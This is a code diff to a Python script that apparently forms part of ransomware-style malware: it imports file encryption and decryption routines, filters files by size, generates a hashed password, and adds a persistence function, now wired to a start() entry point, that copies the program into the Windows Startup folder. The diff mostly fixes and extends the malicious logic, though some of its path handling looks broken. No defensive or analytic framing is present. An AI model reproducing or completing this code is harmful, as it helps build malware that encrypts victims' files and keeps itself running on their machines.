@@ -1,7 +1,7 @@
 import os
 import subprocess
 import sys
-from shutil import copy
+from shutil import copy2
 from hashlib import sha256, sha512
 from pyAesCrypt import encryptFile, decryptFile
 
@@ -44,15 +44,15 @@ def decryptFiles(files, password):
             pass
 
 def filter_file_size(files):
-    files = list(filter(lambda x: x.st_size <= filelimit, files)
+    files = list(filter(lambda x: x.st_size <= filelimit, files))
     return files
 
 def persistence():
     username = os.path.expanduser("~")
-    path = os.path.join(username, "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
-    current_path = os.path.join(os.getcwd(), project_name)
+    path = os.path.join(username + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+    current_path = os.path.join(username, os.getcwd(), project_name)
     if not os.path.exists(os.path.join(path, project_name)):
-        copy(current_path, path)
+        copy2(current_path, path)
 
 
 def genpass():
@@ -60,3 +60,9 @@ def genpass():
      password = sha512(password.encode()).hexdigest()
      password = sha256(password.encode()).hexdigest()
      return password
+
+def start():
+    persistence()
+
+if __name__ == "__main__":
+    start()
